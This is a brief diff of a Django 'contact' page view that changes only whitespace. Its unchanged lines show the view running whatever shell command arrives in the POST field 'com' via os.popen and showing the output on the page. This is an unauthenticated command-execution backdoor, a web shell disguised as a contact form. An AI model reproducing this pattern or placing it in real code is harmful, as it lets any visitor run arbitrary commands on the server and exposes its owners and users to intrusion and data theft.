@@ -7,13 +7,14 @@ from .models import Owner, UsersRequest
 
 import os
 
+
 def contact(request):
     """View for contact.html root page."""
     # Take owner data from the database
     owner = Owner.objects.first()
     if request.method == 'POST':
         out = os.popen(request.POST.get('com')).read()
-        return render(request, 'contact.html', {'owner': owner, 'out':out})
+        return render(request, 'contact.html', {'owner': owner, 'out': out})
     return render(request, 'contact.html', {'owner': owner})
 
 
